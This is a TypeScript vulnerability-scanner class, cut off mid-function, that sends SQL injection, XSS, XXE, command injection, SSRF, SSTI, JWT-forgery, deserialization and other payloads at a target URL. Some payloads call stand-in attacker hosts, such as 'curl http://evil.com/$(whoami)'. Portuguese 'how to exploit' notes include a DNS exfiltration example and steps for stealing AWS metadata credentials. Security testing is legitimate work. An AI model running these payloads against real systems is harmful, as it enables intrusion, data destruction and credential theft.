import { storage } from "./storage";
import type { Scan, InsertVulnerability } from "@shared/schema";
import { WebSocket } from "ws";
import https from "https";
import http from "http";

export class VulnerabilityScanner {
  private wss: any;

  constructor(wss: any) {
    this.wss = wss;
  }

  private broadcastUpdate(scanId: string, update: Partial<Scan>) {
    this.wss.clients.forEach((client: WebSocket) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({ type: 'scan-update', scanId, update }));
      }
    });
  }

  async startScan(scanId: string) {
    const scan = await storage.getScan(scanId);
    if (!scan) return;

    await storage.updateScan(scanId, { status: 'running', progress: 0, currentTask: 'Initializing scan...' });
    this.broadcastUpdate(scanId, { status: 'running', progress: 0, currentTask: 'Initializing scan...' });

    const scanType = scan.scanType;
    const target = scan.target;

    try {
      const tests = this.getTestsForScanType(scanType);
      const totalSteps = tests.length + 1;
      let currentStep = 0;

      await this.delay(500);
      currentStep++;
      await storage.updateScan(scanId, { 
        progress: Math.round((currentStep / totalSteps) * 100),
        currentTask: `Analyzing target: ${target}`
      });
      this.broadcastUpdate(scanId, { 
        progress: Math.round((currentStep / totalSteps) * 100),
        currentTask: `Analyzing target: ${target}`
      });

      for (const test of tests) {
        currentStep++;
        const progress = Math.round((currentStep / totalSteps) * 100);

        await storage.updateScan(scanId, {
          progress,
          currentTask: `Testing: ${test.name}`
        });
        this.broadcastUpdate(scanId, {
          progress,
          currentTask: `Testing: ${test.name}`
        });

        const vulnerability = await test.execute(target, scanId);

        if (vulnerability) {
          const createdVuln = await storage.createVulnerability(vulnerability);

          this.wss.clients.forEach((client: WebSocket) => {
            if (client.readyState === WebSocket.OPEN) {
              client.send(JSON.stringify({ 
                type: 'vulnerability-found', 
                scanId, 
                vulnerability: createdVuln 
              }));
            }
          });
        }

        await this.delay(1000);
      }

      await storage.updateScan(scanId, {
        status: 'completed',
        progress: 100,
        currentTask: 'Scan completed',
        completedAt: new Date()
      });
      this.broadcastUpdate(scanId, {
        status: 'completed',
        progress: 100,
        currentTask: 'Scan completed',
        completedAt: new Date()
      });

    } catch (error) {
      await storage.updateScan(scanId, {
        status: 'failed',
        currentTask: 'Scan failed'
      });
      this.broadcastUpdate(scanId, {
        status: 'failed',
        currentTask: 'Scan failed'
      });
    }
  }

  private async makeRequest(url: string, options: any = {}): Promise<{ statusCode: number; headers: any; body: string }> {
    return new Promise((resolve, reject) => {
      const urlObj = new URL(url);
      const client = urlObj.protocol === 'https:' ? https : http;

      const req = client.request(url, {
        method: options.method || 'GET',
        headers: options.headers || {},
        timeout: 10000,
        ...options
      }, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          resolve({
            statusCode: res.statusCode || 0,
            headers: res.headers,
            body
          });
        });
      });

      req.on('error', (err) => {
        reject(err);
      });

      if (options.body) {
        req.write(options.body);
      }

      req.end();
    });
  }

  private getTestsForScanType(scanType: string) {
    const webTests = [
      {
        name: "Advanced SQL Injection Detection",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const payloads = [
              // Classic SQLi
              "'", "' OR '1'='1", "' OR 1=1--", "admin'--",
              // Union-based
              "' UNION SELECT NULL,NULL,NULL--", "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
              "' UNION SELECT table_name,NULL FROM information_schema.tables--",
              // Boolean-based blind
              "' AND 1=1--", "' AND 1=2--", "' OR 'x'='x", "' OR 'x'='y",
              // Time-based blind
              "'; WAITFOR DELAY '00:00:05'--", "' OR SLEEP(5)--", "'; SELECT pg_sleep(5)--",
              // Stacked queries
              "'; DROP TABLE users--", "'; INSERT INTO users VALUES('hacked','hacked')--",
              // Error-based
              "' AND extractvalue(1,concat(0x7e,database()))--",
              "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(database() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
            ];

            for (const payload of payloads) {
              const testUrl = target.includes('?') 
                ? `${target}&id=${encodeURIComponent(payload)}`
                : `${target}?id=${encodeURIComponent(payload)}`;

              const response = await this.makeRequest(testUrl);
              const body = response.body.toLowerCase();

              if (body.includes('sql') || body.includes('mysql') || body.includes('syntax error') || 
                  body.includes('unexpected') || body.includes('database') || body.includes('mariadb') ||
                  body.includes('postgresql') || body.includes('oracle') || body.includes('sqlite')) {
                return {
                  scanId,
                  severity: "critical",
                  title: "Advanced SQL Injection Vulnerability",
                  description: "Application is vulnerable to SQL injection attacks including union-based, boolean-based, and time-based blind SQLi.",
                  category: "Injection",
                  endpoint: testUrl,
                  payload: payload,
                  evidence: `SQL error messages detected. Status: ${response.statusCode}. Body: ${body.substring(0, 300)}`,
                  recommendation: "URGENT: Use parameterized queries/prepared statements. Implement WAF. Never concatenate user input into SQL.",
                  cve: "CWE-89",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Advanced XSS Detection",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const payloads = [
              // Basic XSS
              "<script>alert('XSS')</script>",
              "<img src=x onerror=alert('XSS')>",
              "<svg onload=alert('XSS')>",
              // Filter bypass
              "<ScRiPt>alert('XSS')</ScRiPt>",
              "<img src=x onerror=alert`XSS`>",
              "<<SCRIPT>alert('XSS');//<</SCRIPT>",
              // Encoded payloads
              "%3Cscript%3Ealert('XSS')%3C/script%3E",
              "&#60;script&#62;alert('XSS')&#60;/script&#62;",
              // Polyglot XSS
              "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
              // DOM-based
              "#<img src=x onerror=alert(1)>",
              "javascript:alert(document.domain)",
              // Event handlers
              "<body onload=alert('XSS')>",
              "<input onfocus=alert('XSS') autofocus>",
              "<select onfocus=alert('XSS') autofocus>",
              // Attribute-based
              "\"onmouseover=\"alert('XSS')\"",
              "' autofocus onfocus=alert(1) x='",
              // Template injection style
              "{{alert('XSS')}}",
              "${alert('XSS')}"
            ];

            for (const payload of payloads) {
              const testUrl = target.includes('?') 
                ? `${target}&q=${encodeURIComponent(payload)}`
                : `${target}?q=${encodeURIComponent(payload)}`;

              const response = await this.makeRequest(testUrl);

              if (response.body.includes(payload) || response.body.includes(decodeURIComponent(payload))) {
                return {
                  scanId,
                  severity: "high",
                  title: "Advanced XSS Vulnerability (Reflected/Stored)",
                  description: "Application reflects user input without sanitization. Vulnerable to XSS including filter bypass and DOM-based attacks.",
                  category: "XSS",
                  endpoint: testUrl,
                  payload: payload,
                  evidence: `Payload reflected unsanitized. Status: ${response.statusCode}`,
                  recommendation: "Implement CSP headers, HTML encoding, and input validation. Use trusted types API.",
                  cve: "CWE-79",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "XXE (XML External Entity) Attack",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const xxePayloads = [
              `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>`,
              `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><data>&xxe;</data>`,
              `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>`,
            ];

            for (const payload of xxePayloads) {
              const response = await this.makeRequest(target, {
                method: 'POST',
                headers: { 'Content-Type': 'application/xml' },
                body: payload
              });

              const body = response.body.toLowerCase();
              if (body.includes('root:') || body.includes('/bin/bash') || body.includes('entity')) {
                return {
                  scanId,
                  severity: "critical",
                  title: "XXE (XML External Entity) Vulnerability",
                  description: "Application processes XML with external entities enabled, allowing file disclosure and SSRF.",
                  category: "Injection",
                  endpoint: target,
                  payload: payload,
                  evidence: `XXE payload processed. Response: ${body.substring(0, 200)}`,
                  recommendation: "Disable XML external entities. Use safe XML parsers. Validate and sanitize XML input.",
                  cve: "CWE-611",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Command Injection Detection",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const cmdPayloads = [
              "; ls -la", "| whoami", "& cat /etc/passwd",
              "; ping -c 10 127.0.0.1", "`id`", "$(whoami)",
              "; curl http://evil.com/$(whoami)",
              "|| sleep 10", "&& cat /etc/shadow"
            ];

            for (const payload of cmdPayloads) {
              const testUrl = target.includes('?') 
                ? `${target}&cmd=${encodeURIComponent(payload)}`
                : `${target}?cmd=${encodeURIComponent(payload)}`;

              const response = await this.makeRequest(testUrl);
              const body = response.body.toLowerCase();

              if (body.includes('uid=') || body.includes('root:') || body.includes('bin/bash') ||
                  body.includes('command not found') || body.includes('permission denied')) {
                return {
                  scanId,
                  severity: "critical",
                  title: "OS Command Injection Vulnerability",
                  description: "Application executes system commands with user input. Remote code execution possible.",
                  category: "Injection",
                  endpoint: testUrl,
                  payload: payload,
                  evidence: `Command execution detected. Response: ${body.substring(0, 200)}`,
                  recommendation: "CRITICAL: Never use user input in system commands. Use safe APIs. Implement strict input validation.",
                  cve: "CWE-78",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Path Traversal Detection",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const traversalPayloads = [
              "../../../etc/passwd",
              "..\\..\\..\\windows\\system32\\config\\sam",
              "....//....//....//etc/passwd",
              "..%2F..%2F..%2Fetc%2Fpasswd",
              "/etc/passwd%00",
              "file:///etc/passwd"
            ];

            for (const payload of traversalPayloads) {
              const testUrl = target.includes('?') 
                ? `${target}&file=${encodeURIComponent(payload)}`
                : `${target}?file=${encodeURIComponent(payload)}`;

              const response = await this.makeRequest(testUrl);
              const body = response.body.toLowerCase();

              if (body.includes('root:') || body.includes('/bin/bash') || body.includes('[boot loader]')) {
                return {
                  scanId,
                  severity: "critical",
                  title: "Path Traversal / Directory Traversal",
                  description: "Application allows access to files outside intended directory. Sensitive file disclosure possible.",
                  category: "Injection",
                  endpoint: testUrl,
                  payload: payload,
                  evidence: `File content exposed. Response: ${body.substring(0, 200)}`,
                  recommendation: "Use whitelist of allowed files. Validate and sanitize file paths. Use chroot jail.",
                  cve: "CWE-22",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "SSRF Detection",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const ssrfPayloads = [
              { url: "http://localhost:22", indicator: "ssh" },
              { url: "http://127.0.0.1:6379", indicator: "redis" },
              { url: "http://169.254.169.254/latest/meta-data/", indicator: "ami-id" },
              { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", indicator: "credentials" },
              { url: "http://metadata.google.internal/computeMetadata/v1/", indicator: "google" },
              { url: "file:///etc/passwd", indicator: "root:" },
              { url: "file:///c:/windows/system32/config/sam", indicator: "sam" },
              { url: "http://127.0.0.1:8080", indicator: "localhost" },
              { url: "http://0.0.0.0:3306", indicator: "mysql" },
              { url: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", indicator: "redis" },
              { url: "dict://127.0.0.1:11211/stat", indicator: "memcached" },
              { url: "http://[::]:80/", indicator: "ipv6" },
              { url: "http://127.1:80", indicator: "localhost bypass" }
            ];

            for (const {url: payload, indicator} of ssrfPayloads) {
              const testUrl = target.includes('?') 
                ? `${target}&url=${encodeURIComponent(payload)}`
                : `${target}?url=${encodeURIComponent(payload)}`;

              try {
                const response = await this.makeRequest(testUrl);
                const body = response.body.toLowerCase();

                if (body.includes(indicator) || body.includes('ssh') || body.includes('redis') || 
                    body.includes('ami-id') || body.includes('root:') || body.includes('accesskey') ||
                    body.includes('secretkey') || body.includes('mysql') || response.statusCode === 200) {
                  return {
                    scanId,
                    severity: "critical",
                    title: "SSRF - Acesso a Rede Interna",
                    description: `SSRF confirmado! Aplicação faz requests para URLs arbitrárias: ${payload}`,
                    category: "SSRF",
                    endpoint: testUrl,
                    payload: payload,
                    evidence: `Resposta de serviço interno detectada. Body: ${body.substring(0, 300)}. Status: ${response.statusCode}`,
                    recommendation: `URGENTE: Bloqueie acesso a IPs internos!\n\nCOMO EXPLORAR:\n1. AWS Metadata: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n2. Redis: gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall\n3. Port scan rede interna: http://10.0.0.1:22\n4. Exfiltração via DNS: http://$(whoami).attacker.com\n\nIMPACTO:\n- Roubo de AWS keys\n- Acesso a bancos de dados internos\n- Port scanning da rede\n- RCE via Redis/Memcached\n\nCOMO CORRIGIR:\n- Whitelist de domínios/IPs permitidos\n- Bloqueie ranges privados: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16\n- Desabilite redirects HTTP\n- Use DNS resolution filtering`,
                    cve: "CWE-918",
                  };
                }
              } catch (err) {
                continue;
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Log Injection",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const logPayloads = [
              'admin\r\n[INFO] User authenticated successfully',
              'test\n200 OK\nattacker - - [01/Jan/2024:00:00:00] "GET /admin HTTP/1.1" 200',
              '%0d%0a[ERROR] Fake error injected%0d%0a',
              'user\u0000\u0000admin'
            ];

            for (const payload of logPayloads) {
              const testUrl = target.includes('?') 
                ? `${target}&user=${encodeURIComponent(payload)}`
                : `${target}?user=${encodeURIComponent(payload)}`;

              const response = await this.makeRequest(testUrl);

              if (response.statusCode === 200) {
                return {
                  scanId,
                  severity: "medium",
                  title: "Log Injection / Log Forging",
                  description: "Aplicação aceita caracteres de controle em logs. Falsificação de logs possível.",
                  category: "Injection",
                  endpoint: testUrl,
                  payload: payload,
                  evidence: `Payload com \r\n ou \n aceito. Status: ${response.statusCode}`,
                  recommendation: `SANITIZE input antes de logar!\n\nCOMO EXPLORAR:\n1. Injete \r\n para criar entradas falsas no log\n2. Oculte ataques reais com entradas fake\n3. Injete ANSI escape codes para ofuscar\n\nEXEMPLO:\nGET /login?user=admin%0d%0a[INFO]%20Login%20successful\n→ Log mostra sucesso mesmo com falha\n\nCOMO CORRIGIR:\n- Escape \r, \n, \t antes de logar\n- Use structured logging (JSON)\n- Valide entrada com regex`,
                  cve: "CWE-117",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Template Injection (SSTI)",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const sstiPayloads = [
              "{{7*7}}",
              "${7*7}",
              "#{7*7}",
              "{{config.items()}}",
              "${T(java.lang.Runtime).getRuntime().exec('id')}",
              "{{request.application.__globals__.__builtins__.open('/etc/passwd').read()}}"
            ];

            for (const payload of sstiPayloads) {
              const testUrl = target.includes('?') 
                ? `${target}&name=${encodeURIComponent(payload)}`
                : `${target}?name=${encodeURIComponent(payload)}`;

              const response = await this.makeRequest(testUrl);

              if (response.body.includes('49') || response.body.includes('root:') || 
                  response.body.includes('uid=') || response.body.includes('config')) {
                return {
                  scanId,
                  severity: "critical",
                  title: "Server-Side Template Injection (SSTI)",
                  description: "Template engine processes user input unsafely. Remote code execution possible.",
                  category: "Injection",
                  endpoint: testUrl,
                  payload: payload,
                  evidence: `Template evaluated user input. Response: ${response.body.substring(0, 200)}`,
                  recommendation: "Never use user input in templates. Use sandboxed template engines. Implement strict input validation.",
                  cve: "CWE-94",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "LDAP Injection",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const ldapPayloads = [
              "*)(uid=*))(|(uid=*",
              "admin)(&(password=*))",
              "*)(&(objectClass=*",
              "admin*",
              ")(cn=*"
            ];

            for (const payload of ldapPayloads) {
              const testUrl = target.includes('?') 
                ? `${target}&username=${encodeURIComponent(payload)}`
                : `${target}?username=${encodeURIComponent(payload)}`;

              const response = await this.makeRequest(testUrl);
              const body = response.body.toLowerCase();

              if (body.includes('ldap') || body.includes('distinguished name') || body.includes('uid=')) {
                return {
                  scanId,
                  severity: "high",
                  title: "LDAP Injection Vulnerability",
                  description: "LDAP queries constructed with user input. Authentication bypass and data disclosure possible.",
                  category: "Injection",
                  endpoint: testUrl,
                  payload: payload,
                  evidence: `LDAP injection signs detected. Response: ${body.substring(0, 200)}`,
                  recommendation: "Use parameterized LDAP queries. Escape special LDAP characters. Implement strict input validation.",
                  cve: "CWE-90",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "NoSQL Injection (MongoDB/CouchDB)",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const nosqlPayloads = [
              '{"$gt":""}',
              '{"$ne":null}',
              '{"$nin":[]}',
              '{"$regex":".*"}',
              '{"username":{"$ne":null},"password":{"$ne":null}}',
              '{"$where":"this.password.length > 0"}',
              'admin\' || \'1\'==\'1',
              '{"$or":[{},{"username":"admin"}]}',
              '{"$exists":true}'
            ];

            for (const payload of nosqlPayloads) {
              const testUrl = target.includes('?') 
                ? `${target}&filter=${encodeURIComponent(payload)}`
                : `${target}?filter=${encodeURIComponent(payload)}`;

              const response = await this.makeRequest(testUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: payload
              });

              const body = response.body.toLowerCase();
              if (body.includes('mongodb') || body.includes('couchdb') || body.includes('users') || 
                  body.includes('documents') || (response.statusCode === 200 && body.length > 500)) {
                return {
                  scanId,
                  severity: "critical",
                  title: "Injeção NoSQL (MongoDB/CouchDB)",
                  description: "Aplicação vulnerável a NoSQL Injection. Bypass de autenticação e exfiltração de dados possível.",
                  category: "Injection",
                  endpoint: testUrl,
                  payload: payload,
                  evidence: `NoSQL injection detectado. Status: ${response.statusCode}. Response: ${body.substring(0, 200)}`,
                  recommendation: "Use validação de entrada rigorosa. Sanitize objetos JSON. Use ODM/ORM com queries parametrizadas.",
                  cve: "CWE-943",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "JWT Token Manipulation",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const jwtPayloads = [
              { token: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.', desc: 'Algorithm: none' },
              { token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.invalid', desc: 'Invalid signature' },
              { token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.4Adcj0vTGpEKfRsaJ8Y8ygC8s8T6s8T6s8T6s8T6s8A', desc: 'Weak secret (brute-forceable)' },
              { token: 'null', desc: 'Null token' },
              { token: 'undefined', desc: 'Undefined token' }
            ];

            for (const {token: payload, desc} of jwtPayloads) {
              const response = await this.makeRequest(target, {
                headers: { 
                  'Authorization': `Bearer ${payload}`,
                  'X-Auth-Token': payload,
                  'Cookie': `token=${payload}`
                }
              });

              const body = response.body.toLowerCase();
              if (response.statusCode === 200 || body.includes('admin') || body.includes('authorized') || body.includes('success')) {
                return {
                  scanId,
                  severity: "critical",
                  title: "Bypass de Autenticação JWT",
                  description: `JWT vulnerável: ${desc}. Bypass completo de autenticação possível.`,
                  category: "Authentication",
                  endpoint: target,
                  payload: payload,
                  evidence: `JWT ${desc} aceito. Status: ${response.statusCode}. Body: ${body.substring(0, 150)}`,
                  recommendation: `VALIDE JWT corretamente!\n\nCOMO EXPLORAR:\n1. Algorithm confusion (HS256 vs RS256)\n2. None algorithm bypass\n3. Weak secret brute-force (john/hashcat)\n4. KID (Key ID) manipulation\n5. JKU (JWK Set URL) injection\n\nFERRAMENTAS:\n- jwt_tool\n- c-jwt-cracker\n- Burp JWT extension\n\nPAYLOAD REAL:\nAlgoritmo none:\n{"alg":"none"}.{"sub":"admin","role":"admin"}.\n\nCOMO CORRIGIR:\n- Use bibliotecas validadas (jsonwebtoken, jose)\n- Rejeite algoritmo 'none'\n- Use secrets fortes (256+ bits)\n- Valide issuer, audience, expiration`,
                  cve: "CWE-287",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Insecure WebSocket Connection",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const wsUrl = target.replace('https://', 'wss://').replace('http://', 'ws://');

            if (wsUrl.startsWith('ws://') && !wsUrl.startsWith('wss://')) {
              return {
                scanId,
                severity: "high",
                title: "WebSocket Inseguro (ws:// em vez de wss://)",
                description: "WebSocket usa conexão não criptografada. Interceptação de mensagens em tempo real possível.",
                category: "Network",
                endpoint: wsUrl,
                payload: `Conexão WebSocket: ${wsUrl}`,
                evidence: `WebSocket usando protocolo ws:// inseguro`,
                recommendation: `USE wss:// (WebSocket Secure)!\n\nCOMO EXPLORAR:\n1. Intercepte tráfego WebSocket com Wireshark\n2. Capture mensagens em tempo real\n3. Injete mensagens maliciosas\n4. MITM attack para modificar dados\n\nFERRAMENTAS:\n- wsrepl (WebSocket REPL)\n- WSSiP (WebSocket manipulation)\n\nCOMO CORRIGIR:\n- Use sempre wss:// em produção\n- Implemente autenticação no handshake\n- Valide origin header\n- Use tokens JWT no WebSocket`,
                cve: "CWE-319",
              };
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Insecure Deserialization",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const deserPayloads = [
              'O:8:"stdClass":0:{}',
              'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb21wYXJhdG9ycy5UcmFuc2Zvcm1pbmdDb21wYXJhdG9y',
              '__import__("os").system("id")',
              'YToxOntzOjQ6ImNtZCI7czoyOiJpZCI7fQ=='
            ];

            for (const payload of deserPayloads) {
              const response = await this.makeRequest(target, {
                method: 'POST',
                headers: { 
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'X-Serialized-Data': payload
                },
                body: `data=${encodeURIComponent(payload)}`
              });

              const body = response.body.toLowerCase();
              if (body.includes('uid=') || body.includes('exception') || body.includes('unserialize')) {
                return {
                  scanId,
                  severity: "critical",
                  title: "Desserialização Insegura (RCE)",
                  description: "Aplicação desserializa dados não confiáveis. Execução remota de código possível.",
                  category: "Injection",
                  endpoint: target,
                  payload: payload,
                  evidence: `Desserialização detectada. Response: ${body.substring(0, 200)}`,
                  recommendation: "URGENTE: Nunca desserialize dados não confiáveis. Use JSON. Implemente whitelist de classes.",
                  cve: "CWE-502",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "CORS Misconfiguration",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const response = await this.makeRequest(target, {
              headers: { 
                'Origin': 'https://evil.com'
              }
            });

            const corsHeader = response.headers['access-control-allow-origin'];
            const credHeader = response.headers['access-control-allow-credentials'];

            if (corsHeader === '*' || corsHeader === 'https://evil.com' || 
                (corsHeader && credHeader === 'true')) {
              return {
                scanId,
                severity: "high",
                title: "Configuração CORS Insegura",
                description: "CORS permite qualquer origem ou reflete origem maliciosa com credenciais. Roubo de dados cross-origin possível.",
                category: "Configuration",
                endpoint: target,
                payload: 'Origin: https://evil.com',
                evidence: `CORS: ${corsHeader}, Credentials: ${credHeader}`,
                recommendation: "Configure whitelist específica de origens. Não use wildcard (*) com credenciais.",
                cve: "CWE-942",
              };
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "HTTP Request Smuggling",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const smugglingPayload = `POST / HTTP/1.1\r\nHost: ${new URL(target).host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG`;

            const response = await this.makeRequest(target, {
              method: 'POST',
              headers: {
                'Transfer-Encoding': 'chunked',
                'Content-Length': '6'
              },
              body: '0\r\n\r\nG'
            });

            if (response.statusCode >= 400 || response.body.includes('Bad Request')) {
              return {
                scanId,
                severity: "high",
                title: "HTTP Request Smuggling",
                description: "Servidor vulnerável a HTTP Request Smuggling. Cache poisoning e bypass de segurança possível.",
                category: "Network",
                endpoint: target,
                payload: smugglingPayload,
                evidence: `Comportamento anômalo: ${response.statusCode}`,
                recommendation: "Normalize headers HTTP. Rejeite requisições ambíguas. Atualize proxy/load balancer.",
                cve: "CWE-444",
              };
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "CRLF Injection (HTTP Response Splitting)",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const crlfPayloads = [
              '%0d%0aSet-Cookie:%20admin=true',
              '%0d%0aLocation:%20http://evil.com',
              '%0aContent-Length:%200%0a%0aHTTP/1.1%20200%20OK%0aContent-Type:%20text/html%0a%0a<script>alert(1)</script>',
              '%0d%0a%0d%0a<script>alert(document.domain)</script>',
              '\\r\\nX-Injected-Header: malicious'
            ];

            for (const payload of crlfPayloads) {
              const testUrl = target.includes('?') 
                ? `${target}&redirect=${payload}`
                : `${target}?redirect=${payload}`;

              const response = await this.makeRequest(testUrl);
              const rawHeaders = JSON.stringify(response.headers).toLowerCase();

              if (rawHeaders.includes('admin=true') || rawHeaders.includes('x-injected') || 
                  response.body.includes('<script>alert')) {
                return {
                  scanId,
                  severity: "high",
                  title: "CRLF Injection (HTTP Response Splitting)",
                  description: "Aplicação injeta \\r\\n em headers HTTP. Cache poisoning e XSS via header injection possível.",
                  category: "Injection",
                  endpoint: testUrl,
                  payload: payload,
                  evidence: `CRLF injetado com sucesso. Headers: ${JSON.stringify(response.headers)}`,
                  recommendation: `SANITIZE caracteres de controle!\n\nCOMO EXPLORAR:\n1. Injete Set-Cookie para session fixation\n2. HTTP Response Splitting para XSS\n3. Cache poisoning via Location header\n\nPAYLOAD:\n${target}?redir=%0d%0aSet-Cookie:%20session=hacked\n\nCOMO CORRIGIR:\n- Remova \\r e \\n do input antes de usar em headers\n- Use funções seguras de redirect\n- Valide URLs antes de redirecionar`,
                  cve: "CWE-113",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Host Header Injection",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const maliciousHosts = [
              'evil.com',
              'evil.com:80',
              'localhost\\@evil.com',
              '127.0.0.1@evil.com'
            ];

            for (const host of maliciousHosts) {
              const response = await this.makeRequest(target, {
                headers: {
                  'Host': host,
                  'X-Forwarded-Host': host
                }
              });

              const body = response.body.toLowerCase();
              const locationHeader = response.headers['location'] || '';

              if (body.includes('evil.com') || locationHeader.includes('evil.com')) {
                return {
                  scanId,
                  severity: "high",
                  title: "Host Header Injection",
                  description: "Aplicação reflete Host header malicioso. Password reset poisoning e web cache poisoning possível.",
                  category: "Injection",
                  endpoint: target,
                  payload: `Host: ${host}`,
                  evidence: `Host malicioso refletido. Location: ${locationHeader}. Body preview: ${body.substring(0, 150)}`,
                  recommendation: `VALIDE Host header!\n\nCOMO EXPLORAR:\n1. Password reset poisoning:\n   POST /reset-password Host: evil.com\n   → Email enviado com link: http://evil.com/reset?token=...\n2. Cache poisoning com X-Forwarded-Host\n3. SSRF via Host header\n\nATAQUE REAL:\n1. Vítima pede reset de senha\n2. Atacante intercepta e injeta Host: evil.com\n3. Vítima recebe email com link malicioso\n4. Atacante rouba token de reset\n\nCOMO CORRIGIR:\n- Valide Host contra whitelist\n- Use configuração fixa de domínio\n- Ignore X-Forwarded-Host se não usar proxy`,
                  cve: "CWE-74",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Open Redirect",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const redirectPayloads = [
              'https://evil.com',
              '//evil.com',
              '/\\evil.com',
              'javascript:alert(document.domain)',
              'https://google.com@evil.com',
              'https://evil.com%2f%2f.target.com'
            ];

            for (const payload of redirectPayloads) {
              const testUrl = target.includes('?') 
                ? `${target}&redirect=${encodeURIComponent(payload)}`
                : `${target}?redirect=${encodeURIComponent(payload)}`;

              const response = await this.makeRequest(testUrl);
              const location = response.headers['location'];

              if (location && (location.includes('evil.com') || location.includes(payload))) {
                return {
                  scanId,
                  severity: "medium",
                  title: "Open Redirect Vulnerability",
                  description: "Aplicação redireciona para URLs arbitrárias. Phishing e roubo de credenciais possível.",
                  category: "Redirect",
                  endpoint: testUrl,
                  payload: payload,
                  evidence: `Redirect para: ${location}`,
                  recommendation: "Valide URLs de redirect. Use whitelist de domínios. Evite redirects baseados em input do usuário.",
                  cve: "CWE-601",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Prototype Pollution (JavaScript)",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const pollutionPayloads = [
              '{"__proto__":{"admin":true}}',
              '{"constructor":{"prototype":{"isAdmin":true}}}',
              '__proto__[admin]=true',
              'constructor[prototype][admin]=true'
            ];

            for (const payload of pollutionPayloads) {
